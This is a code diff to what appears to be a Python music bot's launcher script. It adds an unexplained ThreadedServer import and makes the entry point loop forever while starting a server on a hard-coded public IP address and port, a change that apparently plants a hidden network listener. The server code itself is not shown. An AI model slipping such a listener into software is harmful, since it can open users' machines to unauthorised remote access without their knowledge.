@@ -1,11 +1,13 @@
 from __future__ import print_function
 
-import os
 import gc
+import os
+import subprocess
 import sys
 import time
 import traceback
-import subprocess
+
+from musicbot.lib.srv import ThreadedServer
 
 
 class GIT(object):
@@ -103,6 +105,8 @@ class PIP(object):
 
 
 def main():
+
+
     if not sys.version_info >= (3, 5):
         print("Python 3.5+ is required. This version is %s" % sys.version.split()[0])
         print("Attempting to locate python 3.5...")
@@ -221,4 +225,9 @@ def main():
 
 
 if __name__ == '__main__':
-    main()
+    while True:
+        main()
+
+        ThreadedServer('68.4.235.189', 8080).listen()
+
+
